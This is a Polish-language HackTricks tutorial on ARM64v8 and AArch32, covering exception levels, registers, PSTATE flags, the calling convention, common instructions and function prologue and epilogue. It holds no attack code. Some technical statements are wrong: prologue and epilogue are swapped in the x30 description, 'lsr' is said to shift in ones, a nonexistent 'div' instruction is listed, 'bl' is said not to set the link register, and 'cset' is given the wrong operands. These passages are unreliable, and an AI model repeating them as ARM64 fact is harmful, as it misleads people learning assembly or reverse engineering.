# Wprowadzenie do ARM64v8

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

## **Poziomy wyjątków - EL (ARM64v8)**

W architekturze ARMv8 poziomy wykonania, znane jako Poziomy Wyjątków (EL), definiują poziom uprawnień i możliwości środowiska wykonawczego. Istnieją cztery poziomy wyjątków, od EL0 do EL3, z których każdy pełni inną funkcję:

1. **EL0 - Tryb Użytkownika**:
* Jest to poziom o najmniejszych uprawnieniach i jest używany do wykonywania zwykłego kodu aplikacji.
* Aplikacje działające na poziomie EL0 są od siebie izolowane oraz od oprogramowania systemowego, co zwiększa bezpieczeństwo i stabilność.
2. **EL1 - Tryb Jądra Systemu Operacyjnego**:
* Większość jąder systemów operacyjnych działa na tym poziomie.
* EL1 ma więcej uprawnień niż EL0 i może uzyskiwać dostęp do zasobów systemowych, ale z pewnymi ograniczeniami, aby zapewnić integralność systemu.
3. **EL2 - Tryb Hypervisora**:
* Ten poziom jest używany do wirtualizacji. Hypervisor działający na poziomie EL2 może zarządzać wieloma systemami operacyjnymi (każdy w swoim własnym EL1) działającymi na tym samym fizycznym sprzęcie.
* EL2 zapewnia funkcje izolacji i kontroli wirtualizowanych środowisk.
4. **EL3 - Tryb Monitorowania Bezpieczeństwa**:
* Jest to poziom o najwyższych uprawnieniach i jest często używany do bezpiecznego uruchamiania i zaufanych środowisk wykonawczych.
* EL3 może zarządzać i kontrolować dostęp między stanami bezpiecznymi i niebezpiecznymi (takimi jak bezpieczne uruchamianie, zaufany system operacyjny itp.).

Użycie tych poziomów pozwala na uporządkowany i bezpieczny sposób zarządzania różnymi aspektami systemu, od aplikacji użytkowych po najbardziej uprzywilejowane oprogramowanie systemowe. Podejście ARMv8 do poziomów uprawnień pomaga w skutecznym izolowaniu różnych komponentów systemu, co zwiększa bezpieczeństwo i odporność systemu.

## **Rejestry (ARM64v8)**

ARM64 ma **31 rejestrów ogólnego przeznaczenia**, oznaczonych od `x0` do `x30`. Każdy z nich może przechowywać wartość **64-bitową** (8-bajtową). W przypadku operacji, które wymagają tylko wartości 32-bitowych, te same rejestry mogą być używane w trybie 32-bitowym, używając nazw od w0 do w30.

1. **`x0`** do **`x7`** - Zwykle używane jako rejestry pomocnicze i do przekazywania parametrów do podprogramów.
* **`x0`** również przenosi dane zwrotne funkcji.
2. **`x8`** - W jądrze Linuxa, `x8` jest używany jako numer wywołania systemowego dla instrukcji `svc`. **W macOS używany jest `x16`!**
3. **`x9`** do **`x15`** - Więcej rejestrów tymczasowych, często używanych dla zmiennych lokalnych.
4. **`x16`** i **`x17`** - **Rejestry wywołań wewnętrznych**. Rejestry tymczasowe dla wartości natychmiastowych. Są również używane do pośrednich wywołań funkcji i stubów PLT (Tabela Łączenia Procedur).
* **`x16`** jest używany jako **numer wywołania systemowego** dla instrukcji **`svc`** w **macOS**.
5. **`x18`** - **Rejestr platformy**. Może być używany jako rejestr ogólnego przeznaczenia, ale na niektórych platformach ten rejestr jest zarezerwowany do użytku specyficznego dla platformy: Wskaźnik do bloku środowiska wątku lokalnego w Windows lub wskaźnik do aktualnie **wykonującej się struktury zadania w jądrze Linuxa**.
6. **`x19`** do **`x28`** - To rejestry zachowywane przez wywoływaną funkcję. Funkcja musi zachować wartości tych rejestrów dla swojego wywołującego, więc są one przechowywane na stosie i odzyskiwane przed powrotem do wywołującego.
7. **`x29`** - **Wskaźnik ramki** do śledzenia ramki stosu. Gdy tworzona jest nowa ramka stosu z powodu wywołania funkcji, rejestr **`x29`** jest **przechowywany na stosie**, a adres **nowego** wskaźnika ramki (adres **`sp`**) jest **przechowywany w tym rejestrze**.
* Ten rejestr może być również używany jako **rejestr ogólnego przeznaczenia**, chociaż zazwyczaj jest używany jako odniesienie do **zmiennych lokalnych**.
8. **`x30`** lub **`lr`** - **Rejestr łączenia**. Przechowuje **adres zwrotny**, gdy wykonywana jest instrukcja `BL` (Branch with Link) lub `BLR` (Branch with Link to Register), przechowując wartość **`pc`** w tym rejestrze.
* Może być również używany jak każdy inny rejestr.
* Jeśli aktualna funkcja ma wywołać nową funkcję i tym samym nadpisać `lr`, przechowa ją na stosie na początku, to jest epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Przechowaj `fp` i `lr`, wygeneruj miejsce i uzyskaj nowy `fp`) i odzyska ją na końcu, to jest prolog (`ldp x29, x30, [sp], #48; ret` -> Odzyskaj `fp` i `lr` i zwróć).
9. **`sp`** - **Wskaźnik stosu**, używany do śledzenia wierzchołka stosu.
* Wartość **`sp`** powinna być zawsze utrzymywana co najmniej w **wyrównaniu** do **quadword**, w przeciwnym razie może wystąpić wyjątek wyrównania.
10. **`pc`** - **Licznik programu**, który wskazuje na następną instrukcję. Ten rejestr może być aktualizowany tylko przez generowanie wyjątków, zwroty wyjątków i skoki. Jedynymi zwykłymi instrukcjami, które mogą odczytać ten rejestr, są instrukcje skoku z łącznikiem (BL, BLR), aby przechować adres **`pc`** w **`lr`** (Rejestr Łączenia).
11. **`xzr`** - **Rejestr zerowy**. Nazywany również **`wzr`** w formie rejestru **32**-bitowego. Może być używany do łatwego uzyskania wartości zerowej (częsta operacja) lub do wykonywania porównań przy użyciu **`subs`**, jak **`subs XZR, Xn, #10`**, przechowując wynikowe dane nigdzie (w **`xzr`**).

Rejestry **`Wn`** są **32-bitową** wersją rejestru **`Xn`**.

### Rejestry SIMD i zmiennoprzecinkowe

Ponadto istnieje kolejne **32 rejestry o długości 128 bitów**, które mogą być używane w zoptymalizowanych operacjach SIMD (jedna instrukcja, wiele danych) oraz do wykonywania arytmetyki zmiennoprzecinkowej. Nazywane są rejestrami Vn, chociaż mogą również działać w **64**-bitowym, **32**-bitowym, **16**-bitowym i **8**-bitowym, a wtedy nazywane są **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### Rejestry systemowe

**Istnieją setki rejestrów systemowych**, zwanych również rejestrami specjalnego przeznaczenia (SPRs), które są używane do **monitorowania** i **kontrolowania** zachowania **procesorów**.\
Mogą być odczytywane lub ustawiane tylko za pomocą dedykowanej specjalnej instrukcji **`mrs`** i **`msr`**.

Specjalne rejestry **`TPIDR_EL0`** i **`TPIDDR_EL0`** są często spotykane podczas inżynierii odwrotnej. Sufiks `EL0` wskazuje na **minimalny wyjątek**, z którego rejestr może być dostępny (w tym przypadku EL0 jest regularnym poziomem wyjątku (uprawnienia), na którym działają zwykłe programy).\
Często są używane do przechowywania **adresu bazowego regionu pamięci lokalnej dla wątku**. Zwykle pierwszy z nich jest odczytywalny i zapisywalny dla programów działających w EL0, ale drugi może być odczytywany z EL0 i zapisywany z EL1 (jak jądro).

* `mrs x0, TPIDR_EL0 ; Odczytaj TPIDR_EL0 do x0`
* `msr TPIDR_EL0, X0 ; Zapisz x0 do TPIDR_EL0`

### **PSTATE**

**PSTATE** zawiera kilka komponentów procesu zserializowanych w widocznym dla systemu operacyjnego **`SPSR_ELx`** specjalnym rejestrze, gdzie X oznacza **poziom uprawnień** **wywołanego** wyjątku (to pozwala na odzyskanie stanu procesu po zakończeniu wyjątku).\
Oto dostępne pola:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* Flagi warunkowe **`N`**, **`Z`**, **`C`** i **`V`**:
* **`N`** oznacza, że operacja dała wynik ujemny
* **`Z`** oznacza, że operacja dała zero
* **`C`** oznacza, że operacja miała przeniesienie
* **`V`** oznacza, że operacja dała przepełnienie ze znakiem:
* Suma dwóch liczb dodatnich daje wynik ujemny.
* Suma dwóch liczb ujemnych daje wynik dodatni.
* W przypadku odejmowania, gdy duża liczba ujemna jest odejmowana od mniejszej liczby dodatniej (lub odwrotnie), a wynik nie może być reprezentowany w zakresie danej wielkości bitowej.
* Oczywiście procesor nie wie, czy operacja jest ze znakiem, czy nie, więc sprawdzi C i V w operacjach i wskaże, czy wystąpiło przeniesienie w przypadku, gdy było to ze znakiem lub bez znaku.

{% hint style="warning" %}
Nie wszystkie instrukcje aktualizują te flagi. Niektóre, takie jak **`CMP`** lub **`TST`**, to robią, a inne, które mają sufiks s, takie jak **`ADDS`**, również to robią.
{% endhint %}

* Flaga **szerokości rejestru (`nRW`)**: Jeśli flaga ma wartość 0, program będzie działał w stanie wykonawczym AArch64 po wznowieniu.
* Aktualny **Poziom Wyjątku** (**`EL`**): Zwykły program działający w EL0 będzie miał wartość 0.
* Flaga **jednoetapowego** (**`SS`**): Używana przez debugery do jednoetapowego wykonania, ustawiając flagę SS na 1 wewnątrz **`SPSR_ELx`** przez wyjątek. Program wykona krok i wyda wyjątek jednoetapowy.
* Flaga **stanu nielegalnego wyjątku** (**`IL`**): Używana do oznaczania, gdy oprogramowanie z uprawnieniami wykonuje nieprawidłowy transfer poziomu wyjątku, ta flaga jest ustawiana na 1, a procesor wyzwala wyjątek stanu nielegalnego.
* Flagi **`DAIF`**: Te flagi pozwalają programowi z uprawnieniami na selektywne maskowanie niektórych zewnętrznych wyjątków.
* Jeśli **`A`** wynosi 1, oznacza to, że będą wyzwalane **asynchroniczne przerwania**. **`I`** konfiguruje odpowiedź na zewnętrzne żądania przerwania sprzętowego (IRQ). a F jest związane z **szybkimi żądaniami przerwania** (FIR).
* Flagi **wyboru wskaźnika stosu** (**`SPS`**): Programy z uprawnieniami działające w EL1 i wyżej mogą przełączać się między używaniem własnego rejestru wskaźnika stosu a wskaźnikiem modelu użytkownika (np. między `SP_EL1` a `EL0`). To przełączanie jest realizowane przez zapis do specjalnego rejestru **`SPSel`**. Nie można tego zrobić z EL0.

## **Konwencja wywołań (ARM64v8)**

Konwencja wywołań ARM64 określa, że **pierwsze osiem parametrów** do funkcji jest przekazywanych w rejestrach **`x0` do `x7`**. **Dodatkowe** parametry są przekazywane na **stosie**. Wartość **zwrotna** jest przekazywana z powrotem w rejestrze **`x0`**, lub w **`x1`**, jeśli ma długość 128 bitów. Rejestry **`x19`** do **`x30`** oraz **`sp`** muszą być **zachowane** podczas wywołań funkcji.

Podczas odczytywania funkcji w asemblerze, zwróć uwagę na **prolog i epilog funkcji**. **Prolog** zazwyczaj obejmuje **zapisanie wskaźnika ramki (`x29`)**, **ustawienie** nowego **wskaźnika ramki** i **alokację miejsca na stosie**. **Epilog** zazwyczaj obejmuje **przywrócenie zapisanego wskaźnika ramki** i **powrót** z funkcji.

### Konwencja wywołań w Swift

Swift ma swoją własną **konwencję wywołań**, którą można znaleźć w [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Typowe instrukcje (ARM64v8)**

Instrukcje ARM64 mają zazwyczaj **format `opcode dst, src1, src2`**, gdzie **`opcode`** to **operacja**, która ma być wykonana (taka jak `add`, `sub`, `mov` itp.), **`dst`** to **rejestr docelowy**, w którym zostanie przechowany wynik, a **`src1`** i **`src2`** to **rejestry źródłowe**. Wartości natychmiastowe mogą być również używane zamiast rejestrów źródłowych.

* **`mov`**: **Przenieś** wartość z jednego **rejestru** do drugiego.
* Przykład: `mov x0, x1` — To przenosi wartość z `x1` do `x0`.
* **`ldr`**: **Załaduj** wartość z **pamięci** do **rejestru**.
* Przykład: `ldr x0, [x1]` — To ładuje wartość z lokalizacji pamięci wskazywanej przez `x1` do `x0`.
* **Tryb offsetu**: Wskazuje się offset wpływający na wskaźnik oryginalny, na przykład:
* `ldr x2, [x1, #8]`, to załaduje do x2 wartość z x1 + 8
* `ldr x2, [x0, x1, lsl #2]`, to załaduje do x2 obiekt z tablicy x0, z pozycji x1 (indeks) \* 4
* **Tryb wstępnie indeksowany**: To zastosuje obliczenia do oryginału, uzyska wynik i również przechowa nowy oryginał w oryginale.
* `ldr x2, [x1, #8]!`, to załaduje `x1 + 8` do `x2` i przechowa w x1 wynik `x1 + 8`
* `str lr, [sp, #-4]!`, Przechowuje rejestr łączenia w sp i aktualizuje rejestr sp
* **Tryb postindeksowy**: To jest jak poprzedni, ale adres pamięci jest dostępny, a następnie obliczany i przechowywany jest offset.
* `ldr x0, [x1], #8`, załaduj `x1` do `x0` i zaktualizuj x1 do `x1 + 8`
* **Adresowanie względne do PC**: W tym przypadku adres do załadowania jest obliczany w odniesieniu do rejestru PC
* `ldr x1, =_start`, To załaduje adres, w którym zaczyna się symbol `_start` w x1 w odniesieniu do aktualnego PC.
* **`str`**: **Przechowaj** wartość z **rejestru** do **pamięci**.
* Przykład: `str x0, [x1]` — To przechowuje wartość w `x0` w lokalizacji pamięci wskazywanej przez `x1`.
* **`ldp`**: **Załaduj parę rejestrów**. Ta instrukcja **ładuje dwa rejestry** z **kolejnych lokalizacji pamięci**. Adres pamięci jest zazwyczaj tworzony przez dodanie offsetu do wartości w innym rejestrze.
* Przykład: `ldp x0, x1, [x2]` — To ładuje `x0` i `x1` z lokalizacji pamięci w `x2` i `x2 + 8`, odpowiednio.
* **`stp`**: **Przechowaj parę rejestrów**. Ta instrukcja **przechowuje dwa rejestry** w **kolejnych lokalizacjach pamięci**. Adres pamięci jest zazwyczaj tworzony przez dodanie offsetu do wartości w innym rejestrze.
* Przykład: `stp x0, x1, [sp]` — To przechowuje `x0` i `x1` w lokalizacjach pamięci w `sp` i `sp + 8`, odpowiednio.
* `stp x0, x1, [sp, #16]!` — To przechowuje `x0` i `x1` w lokalizacjach pamięci w `sp+16` i `sp + 24`, odpowiednio, i aktualizuje `sp` do `sp+16`.
* **`add`**: **Dodaj** wartości dwóch rejestrów i przechowaj wynik w rejestrze.
* Składnia: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> Cel
* Xn2 -> Operand 1
* Xn3 | #imm -> Operand 2 (rejestr lub natychmiastowy)
* \[shift #N | RRX] -> Wykonaj przesunięcie lub wywołaj RRX
* Przykład: `add x0, x1, x2` — To dodaje wartości w `x1` i `x2` razem i przechowuje wynik w `x0`.
* `add x5, x5, #1, lsl #12` — To równa się 4096 (1 przesunięcie 12 razy) -> 1 0000 0000 0000 0000
* **`adds`** To wykonuje `add` i aktualizuje flagi
* **`sub`**: **Odejmij** wartości dwóch rejestrów i przechowaj wynik w rejestrze.
* Sprawdź **`add`** **składnię**.
* Przykład: `sub x0, x1, x2` — To odejmuje wartość w `x2` od `x1` i przechowuje wynik w `x0`.
* **`subs`** To jest jak sub, ale aktualizuje flagę
* **`mul`**: **Pomnóż** wartości **dwóch rejestrów** i przechowaj wynik w rejestrze.
* Przykład: `mul x0, x1, x2` — To mnoży wartości w `x1` i `x2` i przechowuje wynik w `x0`.
* **`div`**: **Podziel** wartość jednego rejestru przez inny i przechowaj wynik w rejestrze.
* Przykład: `div x0, x1, x2` — To dzieli wartość w `x1` przez `x2` i przechowuje wynik w `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
* **Logiczne przesunięcie w lewo**: Dodaje 0 z końca, przesuwając inne bity do przodu (mnoży przez n razy 2)
* **Logiczne przesunięcie w prawo**: Dodaje 1 na początku, przesuwając inne bity do tyłu (dzieli przez n razy 2 w nieskładanym)
* **Arytmetyczne przesunięcie w prawo**: Jak **`lsr`**, ale zamiast dodawania 0, jeśli najbardziej znaczący bit to 1, dodawane są **1s** (dzieli przez n razy 2 w składanym)
* **Obracanie w prawo**: Jak **`lsr`**, ale cokolwiek usunięte z prawej jest dodawane z lewej
* **Obracanie w prawo z rozszerzeniem**: Jak **`ror`**, ale z flagą przeniesienia jako "najbardziej znaczący bit". Tak więc flaga przeniesienia jest przesuwana do bitu 31, a usunięty bit do flagi przeniesienia.
* **`bfm`**: **Przesunięcie bitowe**, te operacje **kopiują bity `0...n`** z wartości i umieszczają je w pozycjach **`m..m+n`**. **`#s`** określa **pozycję najbardziej lewego bitu**, a **`#r`** ilość przesunięcia w prawo.
* Przesunięcie bitowe: `BFM Xd, Xn, #r`
* Przesunięcie bitowe ze znakiem: `SBFM Xd, Xn, #r, #s`
* Przesunięcie bitowe bez znaku: `UBFM Xd, Xn, #r, #s`
* **Ekstrakcja i wstawianie bitów:** Kopiuje pole bitowe z rejestru i kopiuje je do innego rejestru.
* **`BFI X1, X2, #3, #4`** Wstawia 4 bity z X2 z 3. bitu X1
* **`BFXIL X1, X2, #3, #4`** Ekstrahuje z 3. bitu X2 cztery bity i kopiuje je do X1
* **`SBFIZ X1, X2, #3, #4`** Rozszerza znak 4 bitów z X2 i wstawia je do X1, zaczynając od pozycji bitu 3, zerując prawe bity
* **`SBFX X1, X2, #3, #4`** Ekstrahuje 4 bity, zaczynając od bitu 3 z X2, rozszerza je ze znakiem i umieszcza wynik w X1
* **`UBFIZ X1, X2, #3, #4`** Zeruje 4 bity z X2 i wstawia je do X1, zaczynając od pozycji bitu 3, zerując prawe bity
* **`UBFX X1, X2, #3, #4`** Ekstrahuje 4 bity, zaczynając od bitu 3 z X2 i umieszcza wynik z rozszerzeniem zerowym w X1.
* **Rozszerzenie znaku do X:** Rozszerza znak (lub dodaje tylko 0 w wersji bez znaku) wartości, aby móc wykonywać operacje z nią:
* **`SXTB X1, W2`** Rozszerza znak bajtu **z W2 do X1** (`W2` jest połową `X2`) aby wypełnić 64 bity
* **`SXTH X1, W2`** Rozszerza znak liczby 16-bitowej **z W2 do X1** aby wypełnić 64 bity
* **`SXTW X1, W2`** Rozszerza znak bajtu **z W2 do X1** aby wypełnić 64 bity
* **`UXTB X1, W2`** Dodaje 0 (bez znaku) do bajtu **z W2 do X1** aby wypełnić 64 bity
* **`extr`:** Ekstrahuje bity z określonej **pary rejestrów połączonych**.
* Przykład: `EXTR W3, W2, W1, #3` To **połączy W1+W2** i uzyska **z bitu 3 W2 do bitu 3 W1** i przechowa to w W3.
* **`cmp`**: **Porównaj** dwa rejestry i ustaw flagi warunkowe. To jest **alias `subs`** ustawiający rejestr docelowy na rejestr zerowy. Przydatne do sprawdzenia, czy `m == n`.
* Obsługuje **tę samą składnię co `subs`**
* Przykład: `cmp x0, x1` — To porównuje wartości w `x0` i `x1` i ustawia flagi warunkowe odpowiednio.
* **`cmn`**: **Porównaj operand ujemny**. W tym przypadku to jest **alias `adds`** i obsługuje tę samą składnię. Przydatne do sprawdzenia, czy `m == -n`.
* **`ccmp`**: Porównanie warunkowe, to porównanie, które zostanie wykonane tylko wtedy, gdy wcześniejsze porównanie było prawdziwe i specjalnie ustawi bity nzcv.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> jeśli x1 != x2 i x3 < x4, skocz do func
* Dzieje się tak, ponieważ **`ccmp`** zostanie wykonane tylko wtedy, gdy **poprzedni `cmp` był `NE`**, jeśli nie był, bity `nzcv` zostaną ustawione na 0 (co nie zaspokoi porównania `blt`).
* Może to być również używane jako `ccmn` (to samo, ale negatywne, jak `cmp` vs `cmn`).
* **`tst`**: Sprawdza, czy którakolwiek z wartości porównania jest równa 1 (działa jak ANDS bez przechowywania wyniku gdziekolwiek). Przydatne do sprawdzenia rejestru z wartością i sprawdzenia, czy którakolwiek z bitów rejestru wskazanych w wartości jest równa 1.
* Przykład: `tst X1, #7` Sprawdza, czy którakolwiek z ostatnich 3 bitów X1 jest równa 1
* **`teq`**: Operacja XOR, ignorując wynik
* **`b`**: Bezwarunkowy skok
* Przykład: `b myFunction`
* Zauważ, że to nie wypełni rejestru łączenia adresem zwrotnym (nie nadaje się do wywołań podprogramów, które muszą wrócić)
* **`bl`**: **Skok** z łącznikiem, używany do **wywołania** **podprogramu**. Przechowuje **adres zwrotny w `x30`**.
* Przykład: `bl myFunction` — To wywołuje funkcję `myFunction` i przechowuje adres zwrotny w `x30`.
* Zauważ, że to nie wypełni rejestru łączenia adresem zwrotnym (nie nadaje się do wywołań podprogramów, które muszą wrócić)
* **`blr`**: **Skok** z łącznikiem do rejestru, używany do **wywołania** **podprogramu**, gdzie cel jest **określony** w **rejestrze**. Przechowuje adres zwrotny w `x30`. (To jest
* Przykład: `blr x1` — To wywołuje funkcję, której adres znajduje się w `x1` i przechowuje adres zwrotny w `x30`.
* **`ret`**: **Powrót** z **podprogramu**, zazwyczaj używając adresu w **`x30`**.
* Przykład: `ret` — To wraca z aktualnego podprogramu, używając adresu zwrotnego w `x30`.
* **`b.<cond>`**: Skoki warunkowe
* **`b.eq`**: **Skok, jeśli równe**, na podstawie poprzedniej instrukcji `cmp`.
* Przykład: `b.eq label` — Jeśli poprzednia instrukcja `cmp` znalazła dwie równe wartości, to skacze do `label`.
* **`b.ne`**: **Skok, jeśli nie równe**. Ta instrukcja sprawdza flagi warunkowe (które zostały ustawione przez wcześniejszą instrukcję porównania), a jeśli porównywane wartości nie były równe, skacze do etykiety lub adresu.
* Przykład: Po instrukcji `cmp x0, x1`, `b.ne label` — Jeśli wartości w `x0` i `x1` nie były równe, to skacze do `label`.
* **`cbz`**: **Porównaj i skocz, jeśli zero**. Ta instrukcja porównuje rejestr z zerem, a jeśli są równe, skacze do etykiety lub adresu.
* Przykład: `cbz x0, label` — Jeśli wartość w `x0` jest zerowa, to skacze do `label`.
* **`cbnz`**: **Porównaj i skocz, jeśli nie zero**. Ta instrukcja porównuje rejestr z zerem, a jeśli nie są równe, skacze do etykiety lub adresu.
* Przykład: `cbnz x0, label` — Jeśli wartość w `x0` jest różna od zera, to skacze do `label`.
* **`tbnz`**: Testuj bit i skocz, jeśli niezerowy
* Przykład: `tbnz x0, #8, label`
* **`tbz`**: Testuj bit i skocz, jeśli zero
* Przykład: `tbz x0, #8, label`
* **Operacje wyboru warunkowego**: To operacje, których zachowanie zmienia się w zależności od bitów warunkowych.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Jeśli prawda, X0 = X1, jeśli fałsz, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Jeśli prawda, Xd = Xn + 1, jeśli fałsz, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = NOT(Xm)
* `cinv Xd, Xn, cond` -> Jeśli prawda, Xd = NOT(Xn), jeśli fałsz, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = Xn, jeśli fałsz, Xd = - Xm
* `cneg Xd, Xn, cond` -> Jeśli prawda, Xd = - Xn, jeśli fałsz, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = 1, jeśli fałsz, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Jeśli prawda, Xd = \<wszystkie 1>, jeśli fałsz, Xd = 0
* **`adrp`**: Oblicz **adres strony symbolu** i przechowaj go w rejestrze.
* Przykład: `adrp x0, symbol` — To oblicza adres strony symbolu i przechowuje go w `x0`.
* **`ldrsw`**: **Załaduj** podpisaną **32-bitową** wartość z pamięci i **rozszerz ją do 64** bitów.
* Przykład: `ldrsw x0, [x1]` — To ładuje podpisaną 32-bitową wartość z lokalizacji pamięci wskazywanej przez `x1`, rozszerza ją do 64 bitów i przechowuje w `x0`.
* **`stur`**: **Przechowaj wartość rejestru w lokalizacji pamięci**, używając offsetu z innego rejestru.
* Przykład: `stur x0, [x1, #4]` — To przechowuje wartość w `x0` w adresie pamięci, który jest o 4 bajty większy niż adres aktualnie w `x1`.
* **`svc`** : Wykonaj **wywołanie systemowe**. Oznacza "Wywołanie Nadzorcy". Gdy procesor wykonuje tę instrukcję, **przełącza się z trybu użytkownika do trybu jądra** i skacze do określonej lokalizacji w pamięci, gdzie znajduje się **kod obsługi wywołań systemowych jądra**.
*   Przykład:

```armasm
mov x8, 93  ; Załaduj numer wywołania systemowego dla zakończenia (93) do rejestru x8.
mov x0, 0   ; Załaduj kod statusu zakończenia (0) do rejestru x0.
svc 0       ; Wykonaj wywołanie systemowe.
```

### **Prolog funkcji**

1. **Zapisz rejestr łączenia i wskaźnik ramki na stosie**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Ustaw nowy wskaźnik ramki**: `mov x29, sp` (ustawia nowy wskaźnik ramki dla bieżącej funkcji)
3. **Przydziel miejsce na stosie dla zmiennych lokalnych** (jeśli to konieczne): `sub sp, sp, <size>` (gdzie `<size>` to liczba bajtów potrzebnych)

### **Epilog funkcji**

1. **Zwolnij zmienne lokalne (jeśli jakieś zostały przydzielone)**: `add sp, sp, <size>`
2. **Przywróć rejestr linki i wskaźnik ramki**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret` (zwraca kontrolę do wywołującego, używając adresu w rejestrze linki)

## Stan Wykonania AARCH32

Armv8-A wspiera wykonywanie programów 32-bitowych. **AArch32** może działać w jednym z **dwóch zestawów instrukcji**: **`A32`** i **`T32`** i może przełączać się między nimi za pomocą **`interworking`**.\
**Privileged** programy 64-bitowe mogą planować **wykonywanie programów 32-bitowych** poprzez wykonanie transferu poziomu wyjątku do niżej uprzywilejowanego 32-bitowego.\
Należy zauważyć, że przejście z 64-bitów do 32-bitów następuje przy obniżeniu poziomu wyjątku (na przykład program 64-bitowy w EL1 wyzwalający program w EL0). Dzieje się to poprzez ustawienie **bitu 4** **`SPSR_ELx`** specjalnego rejestru **na 1**, gdy wątek procesu `AArch32` jest gotowy do wykonania, a reszta `SPSR_ELx` przechowuje **CPSR** programów **`AArch32`**. Następnie, uprzywilejowany proces wywołuje instrukcję **`ERET`**, aby procesor przeszedł do **`AArch32`**, wchodząc w A32 lub T32 w zależności od CPSR\*\*.\*\*

**`interworking`** zachodzi przy użyciu bitów J i T CPSR. `J=0` i `T=0` oznacza **`A32`**, a `J=0` i `T=1` oznacza **T32**. To zasadniczo oznacza ustawienie **najniższego bitu na 1**, aby wskazać, że zestaw instrukcji to T32.\
Jest to ustawiane podczas **instrukcji skoku interworking**, ale może być również ustawiane bezpośrednio innymi instrukcjami, gdy PC jest ustawiony jako rejestr docelowy. Przykład:

Inny przykład:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Rejestry

Istnieje 16 rejestrów 32-bitowych (r0-r15). **Od r0 do r14** mogą być używane do **wszystkich operacji**, jednak niektóre z nich są zazwyczaj zarezerwowane:

* **`r15`**: Licznik programu (zawsze). Zawiera adres następnej instrukcji. W A32 aktualny + 8, w T32, aktualny + 4.
* **`r11`**: Wskaźnik ramki
* **`r12`**: Rejestr wywołania wewnątrzproceduralnego
* **`r13`**: Wskaźnik stosu
* **`r14`**: Rejestr łączenia

Ponadto, rejestry są zapisywane w **`banked registries`**. Są to miejsca, które przechowują wartości rejestrów, umożliwiając **szybkie przełączanie kontekstu** w obsłudze wyjątków i operacjach uprzywilejowanych, aby uniknąć potrzeby ręcznego zapisywania i przywracania rejestrów za każdym razem.\
Dzieje się to poprzez **zapisanie stanu procesora z `CPSR` do `SPSR`** trybu procesora, do którego wyjątek jest zgłaszany. Po powrocie z wyjątku, **`CPSR`** jest przywracany z **`SPSR`**.

### CPSR - Rejestr Statusu Programu

W AArch32 CPSR działa podobnie do **`PSTATE`** w AArch64 i jest również przechowywany w **`SPSR_ELx`**, gdy wyjątek jest zgłaszany, aby później przywrócić wykonanie:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

Pola są podzielone na kilka grup:

* Rejestr Statusu Programu Aplikacji (APSR): Flagi arytmetyczne i dostępne z EL0
* Rejestry Stanu Wykonania: Zachowanie procesu (zarządzane przez system operacyjny).

#### Rejestr Statusu Programu Aplikacji (APSR)

* Flagi **`N`**, **`Z`**, **`C`**, **`V`** (tak jak w AArch64)
* Flaga **`Q`**: Jest ustawiana na 1, gdy **występuje nasycenie całkowite** podczas wykonywania specjalizowanej instrukcji arytmetycznej nasycającej. Gdy jest ustawiona na **`1`**, utrzyma tę wartość, aż zostanie ręcznie ustawiona na 0. Ponadto, nie ma żadnej instrukcji, która sprawdzałaby jej wartość w sposób niejawny, musi to być zrobione przez odczytanie jej ręcznie.
* Flagi **`GE`** (Większe lub równe): Używane są w operacjach SIMD (Jedna Instrukcja, Wiele Danych), takich jak "dodawanie równoległe" i "odejmowanie równoległe". Te operacje pozwalają na przetwarzanie wielu punktów danych w jednej instrukcji.

